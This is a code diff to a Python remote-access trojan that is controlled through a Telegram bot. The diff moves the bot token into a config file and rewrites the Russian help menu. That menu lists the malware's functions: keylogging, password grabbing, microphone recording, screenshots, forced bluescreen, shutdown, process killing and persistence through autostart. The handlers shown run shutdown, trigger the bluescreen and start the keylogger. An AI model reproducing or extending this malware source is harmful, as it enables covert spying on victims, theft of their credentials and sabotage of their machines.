@@ -13,6 +13,7 @@ import requests
 import pyautogui
 import webbrowser
 from ctypes import *
+from settings.config import *
 from sys import platform
 from pynput import keyboard
 from bs4 import BeautifulSoup
@@ -22,14 +23,36 @@ from PIL import Image, ImageGrab
 
 USER_NAME = getpass.getuser()
 
-mytoken = 'Telegram bot token'
+HELP_MESSAGE_RU = '''
+Автор Nixwares
+/off(выкл пк)
+/open(открыть ссылку в браузере)
+/screen(сделать скриншот экрана)
+/process(включить процесс)
+/kill(убить процесс)
+/reboot(перезагрузить пк)
+/ip(узнать ip,город,браузер)
+/rep(запустить файл.mp3)
+/record(записать звуки с микрофона)/bluesreen(синий экран на пк)/oc(выведит операционную систему и имя пк)
+/tasklist(узнать список запущенных процессов)
+/oc(узнать операционную систему и имя системы)
+/bluescreen(включить синий экран)
+/keylogger(записываем все нажатые кнопки)
+/send(отправить файл с записанными кнопками)
+/auto(добавить файл в автозагрузку)
+/logs(получение паролей)
+/help(выводит это сообщение)
+'''
 
-bot = telebot.TeleBot(mytoken)
+HELP_MESSAGE_EN = '''
+
+'''
+
+bot = telebot.TeleBot(TOKEN)
 
 mainkeyboard = telebot.types.ReplyKeyboardMarkup()
 
 mainkeyboard.add('Питание🟢','Запись🔊','Браузер🟡','Приложения🟥','ip🈴','Скриншот👀','Помощь⚒')
-
 
 powerkeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
 
@@ -58,7 +81,7 @@ def commands(message):
                 os.system('shutdown -s')
 
         elif message.text == '/help' or message.text == 'Помощь⚒':
-                bot.send_message(message.chat.id,'/off(выкл пк)\n/open(открыть ссылку в браузере)\n/screen(сделать скриншот экрана)\n/process(включить процесс)\n/kill(убить процесс)\n/reboot(перезагрузить пк)\n/ip(узнать ip,город,браузер)\n/rep(запустить файл.mp3)\n/record(записать звуки с микрофона)\n/bluesreen(синий экран на пк)\n/oc(выведит операционную систему и имя пк)\n/tasklist(узнать список запущенных процессов)',reply_markup=mainkeyboard)
+                bot.send_message(message.chat.id,HELP_MESSAGE_RU if LANGUAGE == 'RU' else HELP_MESSAGE_EN,reply_markup=mainkeyboard)
         elif message.text == '/tasklist':
                 try:
                         bot.send_chat_action(message.chat.id,'upload_document')
@@ -134,7 +157,7 @@ def commands(message):
                     bot.send_message(message.chat.id, 'Синий экран вкл')
 
                 except:
-                   bot.send_message(message.chat.id, 'ошибка,не удалось вкл синий экран')
+                        bot.send_message(message.chat.id, 'ошибка,не удалось вкл синий экран')
 
         elif message.text == '/keylogger':
                 bot.send_message(message.chat.id,'Кейлоггер вкл,что бы получить файл /send')
